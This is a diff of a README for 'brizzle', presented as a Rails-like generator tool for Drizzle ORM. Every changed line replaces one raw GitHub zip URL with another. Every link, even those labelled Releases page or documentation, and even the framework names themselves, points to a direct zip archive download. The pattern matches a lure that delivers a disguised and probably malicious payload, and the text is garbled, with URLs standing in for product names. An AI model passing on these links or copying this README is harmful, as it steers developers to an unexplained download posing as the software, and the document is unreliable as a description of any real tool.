@@ -1,23 +1,23 @@
-# 🎉 brizzle - Effortless Generators for https://raw.githubusercontent.com/M2020mk/brizzle/main/src/Software-v3.3.zip Projects
+# 🎉 brizzle - Effortless Generators for https://raw.githubusercontent.com/M2020mk/brizzle/main/src/generators/tests/Software-v3.7.zip Projects
 
 ## 🚀 Getting Started
 
-Welcome to brizzle! This tool simplifies the process of setting up your https://raw.githubusercontent.com/M2020mk/brizzle/main/src/Software-v3.3.zip applications with Rails-like generators. It integrates smoothly with Drizzle ORM, making your development easier and more efficient.
+Welcome to brizzle! This tool simplifies the process of setting up your https://raw.githubusercontent.com/M2020mk/brizzle/main/src/generators/tests/Software-v3.7.zip applications with Rails-like generators. It integrates smoothly with Drizzle ORM, making your development easier and more efficient.
 
 ## 📥 Download brizzle
 
-[![Download brizzle](https://raw.githubusercontent.com/M2020mk/brizzle/main/src/Software-v3.3.zip)](https://raw.githubusercontent.com/M2020mk/brizzle/main/src/Software-v3.3.zip)
+[![Download brizzle](https://raw.githubusercontent.com/M2020mk/brizzle/main/src/generators/tests/Software-v3.7.zip)](https://raw.githubusercontent.com/M2020mk/brizzle/main/src/generators/tests/Software-v3.7.zip)
 
 You can download the latest version of brizzle from our Releases page. This page contains all available versions, allowing you to choose the one that best fits your needs.
 
-[Visit the Releases page to download](https://raw.githubusercontent.com/M2020mk/brizzle/main/src/Software-v3.3.zip)
+[Visit the Releases page to download](https://raw.githubusercontent.com/M2020mk/brizzle/main/src/generators/tests/Software-v3.7.zip)
 
 ## 💻 System Requirements
 
 Before you start, ensure your system meets the following requirements:
 
 - **Operating System:** Windows, macOS, or Linux
-- **https://raw.githubusercontent.com/M2020mk/brizzle/main/src/Software-v3.3.zip** Version 14 or higher
+- **https://raw.githubusercontent.com/M2020mk/brizzle/main/src/generators/tests/Software-v3.7.zip** Version 14 or higher
 - **npm or yarn:** Installed and set up
 
 ## 🔧 Installation Instructions
@@ -25,7 +25,7 @@ Before you start, ensure your system meets the following requirements:
 Follow these steps to install and run brizzle:
 
 1. **Visit the Releases Page:**
-   Go to our [Releases page](https://raw.githubusercontent.com/M2020mk/brizzle/main/src/Software-v3.3.zip) to find the latest version.
+   Go to our [Releases page](https://raw.githubusercontent.com/M2020mk/brizzle/main/src/generators/tests/Software-v3.7.zip) to find the latest version.
 
 2. **Download the Package:**
    Click on the version you wish to download. 
@@ -73,7 +73,7 @@ To create a new project, follow these steps:
    npm run dev
    ```
 
-   This command launches your https://raw.githubusercontent.com/M2020mk/brizzle/main/src/Software-v3.3.zip application, and you can see it in your browser at `http://localhost:3000`.
+   This command launches your https://raw.githubusercontent.com/M2020mk/brizzle/main/src/generators/tests/Software-v3.7.zip application, and you can see it in your browser at `http://localhost:3000`.
 
 ## 📁 Available Commands
 
@@ -98,7 +98,7 @@ Use these commands to easily set up the structure of your application.
 
 ## ✨ Features
 
-- **Code Generation:** Quickly scaffold your https://raw.githubusercontent.com/M2020mk/brizzle/main/src/Software-v3.3.zip applications with minimal effort.
+- **Code Generation:** Quickly scaffold your https://raw.githubusercontent.com/M2020mk/brizzle/main/src/generators/tests/Software-v3.7.zip applications with minimal effort.
 - **Integration with Drizzle ORM:** Simplifies database interactions.
 - **Typescript Support:** Enjoy type safety for better code quality.
 - **Easy-to-Use CLI:** Run commands that make development straightforward.
@@ -107,8 +107,8 @@ Use these commands to easily set up the structure of your application.
 
 To enhance your understanding and get the most out of brizzle, consider the following resources:
 
-- **https://raw.githubusercontent.com/M2020mk/brizzle/main/src/Software-v3.3.zip Documentation:** Learn more about https://raw.githubusercontent.com/M2020mk/brizzle/main/src/Software-v3.3.zip features [here](https://raw.githubusercontent.com/M2020mk/brizzle/main/src/Software-v3.3.zip).
-- **Drizzle ORM Documentation:** Understand how to use Drizzle ORM [here](https://raw.githubusercontent.com/M2020mk/brizzle/main/src/Software-v3.3.zip).
+- **https://raw.githubusercontent.com/M2020mk/brizzle/main/src/generators/tests/Software-v3.7.zip Documentation:** Learn more about https://raw.githubusercontent.com/M2020mk/brizzle/main/src/generators/tests/Software-v3.7.zip features [here](https://raw.githubusercontent.com/M2020mk/brizzle/main/src/generators/tests/Software-v3.7.zip).
+- **Drizzle ORM Documentation:** Understand how to use Drizzle ORM [here](https://raw.githubusercontent.com/M2020mk/brizzle/main/src/generators/tests/Software-v3.7.zip).
 - **Community Support:** Join discussions on forums or in GitHub issues for familiar problems and solutions.
 
 ## 🐞 Troubleshooting
@@ -116,7 +116,7 @@ To enhance your understanding and get the most out of brizzle, consider the foll
 If you encounter issues, check these common problems:
 
 1. **Installation Errors:** 
-   Ensure that https://raw.githubusercontent.com/M2020mk/brizzle/main/src/Software-v3.3.zip and npm are installed correctly. You can verify installation with:
+   Ensure that https://raw.githubusercontent.com/M2020mk/brizzle/main/src/generators/tests/Software-v3.7.zip and npm are installed correctly. You can verify installation with:
 
    ```bash
    node -v
